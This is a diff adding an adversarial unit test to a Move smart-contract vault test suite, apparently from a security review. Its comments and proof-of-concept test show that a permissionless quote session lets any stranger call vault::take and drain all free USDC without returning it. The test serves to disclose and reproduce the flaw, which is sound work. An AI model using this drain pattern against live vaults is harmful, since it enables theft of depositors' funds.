@@ -159,3 +159,47 @@ fun stale_cap_cannot_manage_quote_adapters() {
     vault::add_quote_adapter<h::TestAdapter>(&mut v, &old_cap);
     abort 0
 }
+
+// ═══════════════════ adversarial: quote-session fund drain ═══════════════════
+//
+// CRITICAL: `begin_quote_session` is permissionless + take-capable, and
+// `end_session` never reconciles taken vs returned balances. Any stranger
+// who can open a quote session can call the public `vault::take` and walk
+// free balances out of the vault without a signed order, without an
+// adapter entry point, and without returning value.
+//
+// Preconditions: vault Open, any quote adapter curator-opted-in and
+// protocol-allowlisted, free balances > 0.
+
+/// PoC: stranger drains ALL free USDC via quote session alone.
+#[test]
+fun attack_quote_session_drains_free_balances() {
+    let mut sc = ts::begin(h::admin_addr());
+    let clock = h::init_protocol(&mut sc);
+    h::new_default_vault(&mut sc);
+    h::simple_deposit(&mut sc, h::alice_addr(), 1_000_000, &clock);
+    enable_quote_adapter(&mut sc);
+
+    // Attacker (bob) — not curator, not depositor, no signed quote.
+    ts::next_tx(&mut sc, h::bob_addr());
+    let mut v = ts::take_shared<TradingVault>(&sc);
+    let ireg = ts::take_shared<IntegrationRegistry>(&sc);
+    let free = vault::free_balance_of<h::USDC>(&v);
+    assert!(free == 1_000_000);
+
+    let mut s = vault::begin_quote_session(&v, &ireg, h::test_adapter());
+    let stolen = vault::take<h::USDC>(&mut v, &mut s, free);
+    // No put. No adapter. No signature. Session still closes.
+    vault::end_session(&v, s);
+
+    assert!(vault::free_balance_of<h::USDC>(&v) == 0);
+    assert!(stolen.value() == 1_000_000);
+    // Attacker holds the drained funds (Balance in this test; on-chain a
+    // Coin transfer to bob would complete the extraction).
+    balance::destroy_for_testing(stolen);
+    ts::return_shared(ireg);
+    ts::return_shared(v);
+
+    clock.destroy_for_testing();
+    sc.end();
+}
